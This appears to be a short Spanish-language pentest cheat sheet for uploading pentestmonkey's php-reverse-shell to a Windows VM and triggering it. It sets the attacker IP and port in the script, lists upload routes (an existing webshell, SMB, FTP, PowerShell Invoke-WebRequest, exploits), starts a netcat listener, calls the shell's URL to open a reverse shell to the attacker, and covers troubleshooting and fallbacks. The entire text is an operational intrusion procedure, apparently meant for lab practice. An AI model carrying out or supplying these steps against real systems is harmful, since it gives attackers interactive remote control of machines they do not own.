**Procedimiento para subir y activar php-reverse-shell en Windows VM**

* * *

### 1\. Preparar php-reverse-shell

- Descargar script php-reverse-shell de repositorio oficial (por ejemplo, pentestmonkey).
    
- Modificar las variables de conexión:
    
    ```php
    $ip = '<Atacker-IP>';  
    $port = <PORT>;
    ```
    

* * *

### 2\. Subir php-reverse-shell a Windows VM

- Usar uno de los métodos:
    
    - Webshell con upload (si disponible).
    - SMB share, FTP, o herramienta de transferencia (e.g., PowerShell `Invoke-WebRequest`).
    - Exploits con upload o scripts base (según contexto).

* * *

### 3\. Configurar listener en atacante

```bash
nc -lvnp <PORT>
```

- Abrir puerto `<PORT>` esperando conexión entrante.

* * *

### 4\. Ejecutar php-reverse-shell en Windows VM

- Acceder vía navegador a la URL donde se ubicó el php-reverse-shell (ejemplo: `http://windows-vm/shell.php`).
- PHP ejecuta conexión reverse shell hacia atacante.

* * *

### 5\. Diagnóstico

- Si listener recibe conexión, shell interactiva establecida.
    
- Si no funciona:
    
    - Revisar firewall Windows.
    - Verificar que PHP esté instalado y funcionando (versión compatible).
    - Comprobar que puerto y IP estén accesibles desde Windows.
    - Confirmar que script php no tenga errores sintácticos.
    - Probar ejecución local del script (CLI) si es posible.

* * *

### 6\. Alternativas

- Si falla, probar otros métodos de reverse shell en PHP o PowerShell.
- Recolectar información del entorno: versión PHP, permisos, logs.

* * *